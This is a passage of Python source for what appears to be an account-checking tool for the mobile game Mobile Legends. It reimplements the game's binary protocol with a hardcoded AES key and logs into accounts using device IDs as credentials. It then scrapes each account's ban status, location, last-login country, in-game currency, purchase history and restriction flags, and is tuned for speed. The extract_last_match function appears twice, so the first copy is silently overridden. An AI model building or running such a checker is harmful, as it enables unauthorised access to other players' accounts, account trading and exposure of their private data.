                return tag, struct.unpack("<f", raw)[0]
            if dtype == SdpType.DOUBLE:
                raw = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", raw)[0]
            if dtype == SdpType.STRING:
                length = self._read_number()
                chunk = self.data[self.offset:self.offset + length]
                try:
                    val = chunk.decode('utf-8')
                except UnicodeDecodeError:
                    val = chunk
                self.offset += length
                return tag, val
            if dtype == SdpType.LIST:
                length = self._read_number()
                val = []
                for _ in range(length):
                    _, item = self._unpack()
                    val.append(item)
                return tag, val
            if dtype == SdpType.DICT:
                length = self._read_number()
                val = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    val[k] = v
                return tag, val
            if dtype == SdpType.STRUCT_BEGIN:
                sub = {}
                while True:
                    st, sv = self._unpack()
                    if isinstance(sv, SdpType) and sv == SdpType.STRUCT_END:
                        break
                    sub[st] = sv
                return tag, SdpStruct(sub)
            if dtype == SdpType.STRUCT_END:
                return tag, SdpType.STRUCT_END
            raise SdpError('bad data type')
        except SdpError:
            raise
        except Exception:
            raise SdpError('unpack failed')


AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

def _aes_decrypt(data):
    if not data or len(data) % 16:
        raise SdpError(f'bad cipher length {len(data) if data else 0}')
    return AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV).decrypt(data).rstrip(b'\x00')


def _sdp_sort_key(kv):
    k = kv[0]
    if isinstance(k, int):
        return (0, k)
    return (1, str(k))


_BAN_PIDS = frozenset({
    2, 6, 10004, 10008, 10129, 10144, 10146, 10160, 11154,
    20006, 20007, 20010, 20011, 20012, 20013,
    50001, 50002, 50003,
})


DEVICE_ID_RE = re.compile(
    r'and_[0-9A-Za-z]{56}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
    r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
)

LOGIN_HOST = 'login.ml.youngjoygame.com'
LOGIN_PORT = 30021
CLIENT_VERSION = '2.2.16.1232.1'
CHANNEL = 'and_usa'


class GameConn:
    def __init__(self, device_id):
        self.device_id = device_id
        self.host = LOGIN_HOST
        self.port = LOGIN_PORT
        self.sequence = 1
        self.socket = None
        self.queue = b''
        self.last_header_size = 0

        parts = device_id.split('_')
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info = info + '_' + parts[2]
            if len(info) >= 32:
                self.imei_md5 = info[:32]
                self.android_id = info[32:48] if len(info) >= 48 else ''
                self.advertising_id = info[48:] if len(info) > 48 else ''
            else:
                self.imei_md5 = info
                self.android_id = ''
                self.advertising_id = ''
        else:
            self.imei_md5 = device_id
            self.android_id = ''
            self.advertising_id = ''

        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0

        self.ban_seen = False
        self.ban_info = {}

    def _sniff(self, res):
        if self.ban_seen or res is None:
            return
        banned, info = inspect_ban(res)
        if banned:
            self.ban_seen = True
            self.ban_info = dict(info)

    def connect(self, host=None, port=None):
        if host:
            self.host = host
        if port:
            self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # [DRAKVEX_TUNE2]
        except Exception:
            pass
        try:
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # [DRAKVEX_TUNE2]
        except Exception:
            pass
        self.socket.settimeout(1.0)  # [DRAKVEX_SPEED]
        self.socket.connect((self.host, self.port))

    def close(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.socket = None
        self.sequence = 1
        self.queue = b''

    def send(self, pid, sdp):
        packet = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        buf = _zc().compress(packet)  # [DRAKVEX_TUNE2]
        size = len(buf) + 4
        if size > 0xFFFFFF:
            raise SdpError('packet too large')
        flags = size | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + buf)
        self.sequence += 1

    def recv(self):
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(65536)  # [DRAKVEX_TUNE2]
                if not d:
                    return None, None
                self.queue += d

            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            self.last_header_size = size

            while len(self.queue) < size:
                d = self.socket.recv(65536)  # [DRAKVEX_TUNE2]
                if not d:
                    return None, None
                self.queue += d

            data = self.queue[4:size]
            self.queue = self.queue[size:]

            if ctype == 1:
                data = zlib.decompress(data)
            elif ctype == 16:
                data = _zd().decompress(data)  # [DRAKVEX_TUNE2]
            elif ctype == 2:
                data = _aes_decrypt(data)
            elif ctype == 3:
                data = zlib.decompress(_aes_decrypt(data))
            elif ctype == 18:
                data = zstd.decompress(_aes_decrypt(data))

            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            body = result.get(6)
            if not isinstance(body, bytes):
                body = result.get(5)
                if not isinstance(body, bytes):
                    return pid, None
            parsed = SdpStruct(body)
            self._sniff(parsed)
            if os.environ.get('DRAKVEX_DEBUG'):
                banned_tag = ' BAN' if self.ban_seen else ''
                print(f'  [pid] {pid}{banned_tag}')
            return pid, parsed
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None

    def login(self):
        self.connect(LOGIN_HOST, LOGIN_PORT)
        self.send(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: CLIENT_VERSION,
            3: CHANNEL,
            4: 'en',
        }))
        pid, res = self.recv()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            zd = res.get(2)
            if isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else:
                self.zone_id = zd or 0
            self.creation_ts = res.get(19, 0)
            return True, res
        return False, res

    def get_server(self):
        self.send(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION,
            5: self.zone_id, 6: CHANNEL,
        }))
        pid, res = self.recv()
        if pid == 6 and res:
            addr = res[1]
            self.game_host, port_str = addr.split(':')
            self.game_port = int(port_str)
            return True, res
        return False, res

    def enter_game(self):
        self.close()
        self.connect(self.game_host, self.game_port)
        self.send(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id,
        }))
        self.send(10101, SdpStruct({0: 0, 2: 2}))

    def handshake(self, tries=3):  # [DRAKVEX_SPEED]
        for _ in range(tries):
            pid, _ = self.recv()
            if pid is None or pid == -1:
                return False
            if pid == 10002:
                return True
        return False

    def verify_role(self, tries=8):  # [DRAKVEX_SPEED]
        self.send(10003, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            3: CLIENT_VERSION, 4: CHANNEL, 5: self.device_id,
        }))
        for _ in range(tries):
            pid, _ = self.recv()
            if pid is None or pid == -1:
                return False
            if pid in (10004, 10008):
                return True
        return False

    def lookup(self, value, kind='id'):
        if kind == 'id':
            try:
                payload = SdpStruct({1: int(value)})
            except (TypeError, ValueError):
                return None
        else:
            payload = SdpStruct({0: str(value).strip()})
        self.send(11153, payload)

        miss = 0
        for _ in range(10):  # [DRAKVEX_SPEED]
            pid, res = self.recv()
            if pid is None or pid == -1:
                return None
            if pid == 11154:
                return res
            if pid == 20001:
                miss += 1
                if self.last_header_size < 100 and miss >= 2:
                    return None
        return None

    def role_info(self, role_id, zone_id):
        self.send(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        best = None
        for _ in range(5):  # [DRAKVEX_SPEED]
            pid, res = self.recv()
            if pid is None or pid == -1:
                break
            if pid == 20001:
                continue
            if pid == 10129 and res is not None:
                if best is None:
                    best = res
                try:
                    if int(res.get(9, 0) or 0) > 0:
                        return res
                except (TypeError, ValueError):
                    pass
        return best

    def skin_info(self, role_id, zone_id, tries=1):  # [DRAKVEX_TUNED]
        for _ in range(tries):
            self.send(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            timeouts = 0
            while timeouts < 1:  # [DRAKVEX_SPEED]
                pid, res = self.recv()
                if pid is None:
                    break
                if pid == -1:
                    timeouts += 1
                elif pid == 10144:
                    return res
                elif pid == 20001:
                    continue
        return None

    def v2l_status(self, role_id, zone_id, tries=1):  # [DRAKVEX_TUNED]
        self.send(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        timeouts = 0
        while timeouts < 1:  # [DRAKVEX_SPEED]
            pid, res = self.recv()
            if pid is None:
                break
            if pid == -1:
                timeouts += 1
            elif pid == 10208 and res:
                return {'_src': 10208, '_data': dict(res)}
            elif pid == 20001:
                continue
        return None


BAN_REASONS = {
    '21': 'Using Plug-in Apps to Compromise Competitive Fairness',
    '22': 'Account Sharing / Boosting',
    '23': 'Verbal Abuse / Toxic Behavior',
    '24': 'Cheating in Ranked Match',
    '25': 'Payment Fraud / Chargeback',
    '26': 'Account Trading / Sale',
}


def _walk_ban(obj, out):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == 'ban_reason':
                code = str(v)
                out['ban_code'] = code
                out['reason_name'] = BAN_REASONS.get(code, f'Reason Code {code}')
            elif k == 'endtime_day':
                out['endtime_day'] = v
            elif k == 'endtime_hour':
                out['endtime_hour'] = v
            elif k == 'endtime_min':
                out['endtime_min'] = v
            elif k == 'endtime_sec':
                out['endtime_sec'] = v
            elif isinstance(k, str) and 'ban' in k.lower():
                out[str(k)] = v
            if isinstance(v, (dict, list)):
                _walk_ban(v, out)
    elif isinstance(obj, list):
        for item in obj:
            _walk_ban(item, out)


def inspect_ban(sdp):
    info = {}
    if sdp:
        _walk_ban(dict(sdp), info)
    has_end = 'endtime_day' in info and info['endtime_day'] is not None
    has_code = 'ban_code' in info and info['ban_code'] not in (None, '', '0')
    banned = has_end or (has_code and info.get('reason_name'))
    if os.environ.get('DRAKVEX_DEBUG') and info:
        print(f'  [ban-probe] keys={list(info.keys())[:8]} banned={banned}')
    return banned, info


def format_ban_duration(info):
    day = info.get('endtime_day')
    if day is None:
        return None
    h = as_int(info.get('endtime_hour', 0))
    m = as_int(info.get('endtime_min', 0))
    s = as_int(info.get('endtime_sec', 0))
    return f"day {day}, {h:02d}:{m:02d}:{s:02d}"


HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny",
    18: "Layla", 19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya",
    23: "Gord", 24: "Natalia", 25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha",
    29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson", 33: "Cyclops",
    34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana",
    39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley", 43: "Irithel",
    44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley",
    54: "Jawhead", 55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis",
    59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja", 63: "Selena",
    64: "Aldous", 65: "Claude", 66: "Vale", 67: "Leomord", 68: "Lunox",
    69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith",
    74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg",
    84: "Ling", 85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha",
    89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla", 93: "Atlas",
    94: "Popol and Kupa", 95: "Yu Zhong", 96: "Luo Yi", 97: "Benedetta",
    98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda",
    103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan",
    108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn",
    118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan",
    123: "Cici", 124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas",
    128: "Kalea", 129: "Zetian", 130: "Obsidia",
}

EMBLEM_MAP = {
    1: "Fighter", 2: "Assassin", 3: "Mage", 4: "Marksman",
    5: "Support", 6: "Tank", 7: "Common",
}

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold",
                4: "Platinum", 5: "Diamond"}

MODE_MAP = {
    0: "Classic", 1: "Ranked", 2: "Brawl",
    3: "AI", 4: "Custom", 5: "Mayhem", 6: "Arcade",
}

SKIN_TIER_MAP = {1: "Common", 2: "Exceptional", 3: "Deluxe",
                 4: "Exquisite", 5: "Grand", 6: "Supreme"}

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"),
    (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"),
    (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"),
    (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"),
    (280000, float('inf'), "World Collector"),
]


def map_rank(p):
    try:
        p = int(p)
    except (TypeError, ValueError):
        return "Unranked"
    if p <= 0:
        return "Unranked"
    table = [
        (0, 4, "Warrior III"), (5, 9, "Warrior II"), (10, 14, "Warrior I"),
        (15, 19, "Elite IV"), (20, 24, "Elite III"), (25, 29, "Elite II"),
        (30, 34, "Elite I"),
        (35, 39, "Master IV"), (40, 44, "Master III"), (45, 49, "Master II"),
        (50, 54, "Master I"),
        (55, 59, "Grandmaster IV"), (60, 64, "Grandmaster III"),
        (65, 69, "Grandmaster II"), (70, 74, "Grandmaster I"),
        (75, 81, "Epic IV"), (82, 88, "Epic III"), (89, 95, "Epic II"),
        (96, 107, "Epic I"),
        (108, 114, "Legend IV"), (115, 121, "Legend III"),
        (122, 128, "Legend II"), (129, 135, "Legend I"),
    ]
    for lo, hi, name in table:
        if lo <= p <= hi:
            return name
    if 136 <= p <= 160:
        return f"Mythic {p - 135}"
    if 161 <= p <= 195:
        return f"Mythical Honor {p - 135}"
    if 196 <= p <= 235:
        return f"Mythical Glory {p - 195}"
    if p >= 236:
        return f"Mythical Immortal {p - 235}"
    return "Unranked"


def map_collector(p):
    try:
        p = int(p)
    except (TypeError, ValueError):
        return "No Tier"
    if p < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= p < hi:
            if name == "World Collector":
                return name
            span = (hi - lo) / 5
            lvl = int((p - lo) // span)
            lvl = max(0, min(4, lvl))
            roman = ["V", "IV", "III", "II", "I"][lvl]
            return f"{name} {roman}"
    return "No Tier"


def fmt_ts(ts):
    if not isinstance(ts, int) or ts < 100000000:
        return None
    try:
        utc = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
        pht = utc + datetime.timedelta(hours=8)
        return pht.strftime("%Y-%m-%d %H:%M")
    except Exception:
        return None


def fmt_ts_full(ts):
    if not isinstance(ts, int) or ts < 100000000:
        return None
    try:
        utc = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
        pht = utc + datetime.timedelta(hours=8)
        return pht.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return None


_SKIN_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skin_db.json')
try:
    with open(_SKIN_DB_PATH, 'r', encoding='utf-8') as _f:
        _raw = _f.read().strip()
        if not _raw.startswith('{'):
            _raw = '{' + _raw
        SKIN_DB = json.loads(_raw)
except Exception as _e:
    SKIN_DB = {}
    try:
        append_line(FILE_ERRORS, f'skin_db load: {_e}')
    except Exception:
        pass

_SKIN_TIER_LABELS = {
    'common':      'Common',
    'exceptional': 'Exceptional',
    'deluxe':      'Deluxe',
    'exquisite':   'Exquisite',
    'grand':       'Grand',
    'supreme':     'Supreme',
    'unknown':     'Unknown',
}


def get_skin_tier(skin_id):
    tier = SKIN_DB.get(str(skin_id))
    if not tier:
        return None
    return _SKIN_TIER_LABELS.get(tier, tier.capitalize())


def parse_skin_counts(tag_118):
    if not tag_118 or not isinstance(tag_118, dict):
        return {}
    skin_data = None
    for k in (4, 0, 1):
        v = tag_118.get(k)
        if isinstance(v, dict) and v:
            skin_data = v
            break
    if skin_data is None:
        skin_data = tag_118
    if not isinstance(skin_data, dict):
        return {}
    counts = {
        6: "Supreme Skins", 5: "Grand Skins", 4: "Exquisite Skins",
        3: "Deluxe Skins", 2: "Exceptional Skins", 1: "Common Skins",
    }
    out = {}
    for skin_id, count in skin_data.items():
        try:
            sid = int(skin_id)
        except (ValueError, TypeError):
            continue
        if sid in counts:
            out[counts[sid]] = count
    return out


def _find_last_match_ts(entry):
    if not isinstance(entry, dict):
        return 0
    now = int(time.time())
    lower = now - 3 * 365 * 86400
    upper = now + 2 * 86400

    def _norm(v):
        if not isinstance(v, int) or isinstance(v, bool):
            return None
        if v > 10 ** 15:
            v //= 1_000_000
        elif v > 10 ** 12:
            v //= 1_000
        return v if lower <= v <= upper else None

    for key in (9, 10, 6, 7, 8, 11, 12, 13, 14, 15, 16, 17, 18):
        t = _norm(entry.get(key))
        if t:
            return t

    for v in entry.values():
        t = _norm(v)
        if t:
            return t

    for v in entry.values():
        if isinstance(v, dict):
            for vv in v.values():
                t = _norm(vv)
                if t:
                    return t

    for v in entry.values():
        if isinstance(v, str):
            for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"):
                try:
                    dt = datetime.datetime.strptime(v.strip(), fmt)
                    return int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())
                except Exception:
                    pass

    return 0


def extract_last_match(ri, p):
    containers = []
    for src in (ri, p):
        if not isinstance(src, dict):
            continue
        for tag in (120, 130, 145, 150, 190, 200, 33, 35, 40, 55,
                    70, 78, 85, 88, 99, 105, 110, 100):
            v = src.get(tag)
            if isinstance(v, (dict, list)) and v:
                containers.append(v)

    entry = None
    for c in containers:
        if isinstance(c, list) and c and isinstance(c[0], dict):
            entry = c[0]
            break
        if isinstance(c, dict):
            for k in sorted(c.keys(), key=lambda x: (isinstance(x, str), x)):
                if isinstance(c[k], dict):
                    entry = c[k]
                    break
            if entry:
                break

    if not entry:
        return None

    hero_id = entry.get(0, 0) or entry.get(1, 0) or 0
    hero = HERO_ID_MAP.get(hero_id, f"Hero#{hero_id}") if hero_id else "?"

    kills    = as_int(entry.get(2, 0))
    deaths   = as_int(entry.get(3, 0))
    assists  = as_int(entry.get(4, 0))
    duration = as_int(entry.get(5, 0))
    result_raw = entry.get(6, entry.get(7, 0))
    mode_raw = entry.get(8, 0)
    ts       = _find_last_match_ts(entry)
    mvp      = entry.get(11, 0)
    gold     = as_int(entry.get(12, 0))

    if result_raw in (1, '1', 'win', 'WIN', True):
        result = "WIN"
    elif result_raw in (0, '0', 'loss', 'LOSS', False):
        result = "LOSS"
    else:
        result = "?"

    mode_key = as_int(mode_raw, -1)
    mode = MODE_MAP.get(mode_key, f"Mode {mode_raw}")

    return {
        'hero':       hero,
        'kills':      kills,
        'deaths':     deaths,
        'assists':    assists,
        'kda':        f"{kills}/{deaths}/{assists}",
        'kda_ratio':  round((kills + assists) / max(deaths, 1), 2),
        'result':     result,
        'mode':       mode,
        'duration':   human_dur(duration) if duration else "?",
        'duration_s': duration,
        'gold':       gold,
        'mvp':        bool(mvp),
        'played_at':  fmt_ts(ts),
        'played_ts':  ts,
    }


def extract_last_match(ri, p):
    containers = []
    for src in (ri, p):
        if not isinstance(src, dict):
            continue
        for tag in (120, 130, 145, 150, 190, 200):
            v = src.get(tag)
            if isinstance(v, (dict, list)) and v:
                containers.append(v)

    entry = None
    for c in containers:
        if isinstance(c, list) and c and isinstance(c[0], dict):
            entry = c[0]
            break
        if isinstance(c, dict):
            for k in sorted(c.keys(), key=lambda x: (isinstance(x, str), x)):
                if isinstance(c[k], dict):
                    entry = c[k]
                    break
            if entry:
                break

    if not entry:
        return None

    hero_id = entry.get(0, 0) or entry.get(1, 0) or 0
    hero = HERO_ID_MAP.get(hero_id, f"Hero#{hero_id}") if hero_id else "?"

    kills    = as_int(entry.get(2, 0))
    deaths   = as_int(entry.get(3, 0))
    assists  = as_int(entry.get(4, 0))
    duration = as_int(entry.get(5, 0))
    result_raw = entry.get(6, entry.get(7, 0))
    mode_raw = entry.get(8, 0)
    ts       = as_int(entry.get(9, entry.get(10, 0)))
    mvp      = entry.get(11, 0)
    gold     = as_int(entry.get(12, 0))

    if result_raw in (1, '1', 'win', 'WIN', True):
        result = "WIN"
    elif result_raw in (0, '0', 'loss', 'LOSS', False):
        result = "LOSS"
    else:
        result = "?"

    mode_key = as_int(mode_raw, -1)
    mode = MODE_MAP.get(mode_key, f"Mode {mode_raw}")

    return {
        'hero':       hero,
        'kills':      kills,
        'deaths':     deaths,
        'assists':    assists,
        'kda':        f"{kills}/{deaths}/{assists}",
        'kda_ratio':  round((kills + assists) / max(deaths, 1), 2),
        'result':     result,
        'mode':       mode,
        'duration':   human_dur(duration) if duration else "?",
        'duration_s': duration,
        'gold':       gold,
        'mvp':        bool(mvp),
        'played_at':  fmt_ts(ts),
        'played_ts':  ts,
    }


def extract_player(result, role_info=None, creation_ts=0, v2l=None):
    if not result or not result.get(0) or len(result[0]) == 0:
        return None
    try:
        p = result[0][0]
        ri = role_info if isinstance(role_info, dict) else {}

        nickname = p.get(2, "") or "Unknown"
        player_id = p.get(0, 0)
        server = p.get(1, 0)
        level = as_int(p.get(3, 0))

        skin_count = as_int(p.get(83, 0))
        hero_count = as_int(p.get(4, 0))
        matches = as_int(p.get(17, 0))
        rating_score = as_int(p.get(9, 0))
        if ri:
            hero_count = as_int(ri.get(9, hero_count)) or hero_count
            matches = as_int(ri.get(22, matches)) or matches

        loc = p.get(71)
        if isinstance(loc, list) and len(loc) >= 2:
            location = ", ".join(str(x) for x in loc if x)
        else:
            location = None

        last_login = fmt_ts(p.get(5, 0))
        last_country = p.get(87, "")
        reg_country = p.get(97, "")

        squad_icon = p.get(31, "")
        squad_name = str(p.get(30, "")).replace("`", "").strip()
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else None

        rank_now = map_rank(p.get(8))
        rank_top = map_rank(p.get(95))
        ach = p.get(7, 0)

        t136 = p.get(136, {})
        coll_pts = t136.get(9, 0) if isinstance(t136, dict) else 0

        t91 = p.get(91, [])
        history = [HERO_ID_MAP.get(h, f"Hero#{h}") for h in reversed(t91)] if t91 else []

        v2l_status = None
        if v2l and isinstance(v2l, dict):
            src = v2l.get("_src", 0)
            data = v2l.get("_data", {})
            probes = (10, 11) if src == 10208 else (0, 2, 3, 5)
            for tag in probes:
                v = data.get(tag)
                if v is not None:
                    try:
                        v2l_status = "Enabled" if int(v) > 0 else "Disabled"
                        break
                    except (ValueError, TypeError):
                        pass

        followers = ri.get(23, 0) or p.get(15, 0) or 0

        likes = 0
        motto = None
        ri24 = ri.get(24)
        if isinstance(ri24, int):
            likes = ri24
        elif isinstance(ri24, str) and ri24.strip():
            motto = ri24.strip()
        if not likes:
            likes = p.get(61, 0) or 0

        credits = None
        cs = ri.get(20, 0) or p.get(80, 0)
        if isinstance(cs, int) and cs > 0:
            credits = f"{cs}/110"

        restriction = None
        t117 = ri.get(117, p.get(117))
        if t117 is not None:
            if isinstance(t117, dict):
                raw = t117.get(0, 0)
            elif isinstance(t117, int):
                raw = t117
            else:
                raw = 0
            flags = int(raw) + 1
            pctv = round((flags / 7) * 100, 1)
            if pctv < 30:
                restriction = f"{pctv}% low risk"
            elif pctv < 60:
                restriction = f"{pctv}% medium risk"
            else:
                restriction = f"{pctv}% high risk"

        affinity = None
        names = []
        for entry in ri.get(82, []) or []:
            if isinstance(entry, dict):
                n = entry.get(2, "")
                if isinstance(n, str) and n:
                    names.append(n)
        if names:
            affinity = ", ".join(names)
        else:
            t135 = p.get(135, {})
            aff_lvl = t135.get(1, 0) if isinstance(t135, dict) else 0
            if aff_lvl:
                affinity = AFFINITY_MAP.get(aff_lvl, f"Level {aff_lvl}")

        sl_exp = 0
        for tag in (21, 47, 50):
            v = ri.get(tag) or p.get(tag) or 0
            if isinstance(v, int) and v > 1700000000:
                sl_exp = v
                break
        starlight = "Yes" if sl_exp > time.time() else "No"
        starlight_expiry = fmt_ts(sl_exp) if sl_exp else None

        starlight_months = p.get(60, 0) or 0
        tickets = ri.get(49, 0) or p.get(49, 0) or 0
        total_wins = p.get(18, 0) or 0

        min_ts = 1451577600
        fallback = p.get(6, 0)
        if creation_ts and creation_ts >= min_ts:
            created = fmt_ts_full(creation_ts)
            age_ts = creation_ts
        elif fallback and fallback >= min_ts:
            created = fmt_ts_full(fallback)
            age_ts = fallback
        else:
            created = None
            age_ts = 0

        age = None
        if age_ts:
            now = datetime.datetime.now(datetime.timezone.utc)
            start = datetime.datetime.fromtimestamp(age_ts, datetime.timezone.utc)
            d = (now - start).days
            y, m, r = d // 365, (d % 365) // 30, d % 30
            if y:
                age = f"{y}y {m}m {r}d"
            elif m:
                age = f"{m}m {r}d"
            else:
                age = f"{d}d"

        win_count = ri.get(22, 0) or 0
        total_battles = ri.get(77, 0) or p.get(17, 0) or 0

        win_rate = None
        wins_for_rate = win_count if win_count else total_wins
        if total_battles > 0 and wins_for_rate > 0:
            wr = (wins_for_rate / total_battles) * 100
            win_rate = f"~{min(wr, 100):.1f}%" if wr > 100 else f"{wr:.1f}%"

        diamonds = 0
        bp = 0
        cur = ri.get(111)
        if isinstance(cur, dict):
            diamonds = as_int(cur.get(0, 0))
            bp = as_int(cur.get(1, 0))
        elif isinstance(cur, int):
            diamonds = cur
        elif isinstance(cur, list) and cur:
            diamonds = as_int(cur[0]) if len(cur) > 0 else 0
            bp = as_int(cur[1]) if len(cur) > 1 else 0
        if not bp:
            bp = int(p.get(83, 0) or 0)

        last_dia = fmt_ts(p.get(42, 0))
        mcl_wins = ri.get(46, 0) or p.get(104, p.get(103, 0)) or 0

        skin_counts = {
            "Supreme Skins":     0,
            "Grand Skins":       0,
            "Exquisite Skins":   0,
            "Deluxe Skins":      0,
            "Exceptional Skins": 0,
            "Common Skins":      0,
        }
        t118 = ri.get(118) or p.get(118)
        if t118:
            parsed = parse_skin_counts(t118)
            if parsed:
                skin_counts.update(parsed)

        latest_skin_id = None
        latest_skin_raw = p.get(175, 0)
        if latest_skin_raw:
            tier_label = get_skin_tier(latest_skin_raw) or "Unknown"
            latest_skin_id = f"{latest_skin_raw} ({tier_label})"
        latest_skin_date = fmt_ts(p.get(176, 0))

        skin_history = []
        for entry in (ri.get(92) or [])[:8]:
            if isinstance(entry, dict):
                sid = entry.get(0, 0)
                tier = entry.get(2, 0)
                ts = entry.get(4, 0)
                tname = SKIN_TIER_MAP.get(tier, f"T{tier}")
                date = fmt_ts(ts) or "?"
                skin_history.append(f"{sid}({tname})|{date}")

        emblems = []
        tag101 = ri.get(101)
        if isinstance(tag101, dict) and tag101:
            for eid in sorted(tag101.keys()):
                name = EMBLEM_MAP.get(eid, f"E{eid}")
                emblems.append(f"{name}:Lv{tag101[eid]}")

        last_heroes = []
        t45 = p.get(45, {})
        if isinstance(t45, dict) and t45:
            entries = []
            for entry in t45.values():
                if isinstance(entry, dict):
                    hid = entry.get(0, 0)
                    hts = entry.get(1, 0)
                    entries.append((hts, HERO_ID_MAP.get(hid, f"Hero#{hid}")))
            entries.sort(key=lambda x: x[0], reverse=True)
            last_heroes = [h for _, h in entries[:8]]

        last_match = extract_last_match(ri, p)

        return {
            'last_match': last_match,
            'nickname': nickname,
            'player_id': player_id,
            'server': server,
            'level': level,
            'skin_count': skin_count,
            'hero_count': hero_count,
            'matches': matches,
            'rating_score': rating_score,
            'location': location,
            'last_login': last_login,
            'last_login_country': last_country or None,
            'region_country': reg_country or None,
            'high_rank': rank_top,
            'current_rank': rank_now,
            'achievement_points': ach,
            'collector_point': coll_pts,
            'collector_tier': map_collector(coll_pts),
            'hero_history': history,
            'squad': squad,
            'affinity': affinity,
            'likes': likes,
            'credits_score': credits,
            'followers': followers,
            'starlight_user': starlight,
            'starlight_expiry': starlight_expiry,
            'starlight_months': starlight_months,
            'restriction_flags': restriction,
            'mcl_champion_wins': mcl_wins,
            'creation_date': created,
            'account_age': age,
            'total_battles': total_battles,
            'win_rate': win_rate,
            'diamonds': diamonds,
            'battle_points': bp,
            'tickets': tickets,
            'latest_skin_id': latest_skin_id,
            'latest_skin_date': latest_skin_date,
            'v2l_status': v2l_status,
            'last_diamond_purchase': last_dia,
            'squad_motto': motto,
            'skin_breakdown': skin_counts,
            'skin_history': skin_history,
            'emblem_levels': emblems,
            'last_heroes_purchase': last_heroes,
            'ban_status': 'CLEAN',
            'ban_reason': None,
            'ban_code': None,
            'ban_duration': None,
        }
    except Exception as e:
        try:
            append_line(FILE_ERRORS, f'extract | {type(e).__name__}: {e}')
        except Exception:
            pass
        return None


def fetch_info_by_device(device_id):
    conn = GameConn(device_id)
    try:
        ok, _ = conn.login()
        if not ok:
            return {'error': 'login failed', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        account_id = conn.account_id
        zone_id = conn.zone_id
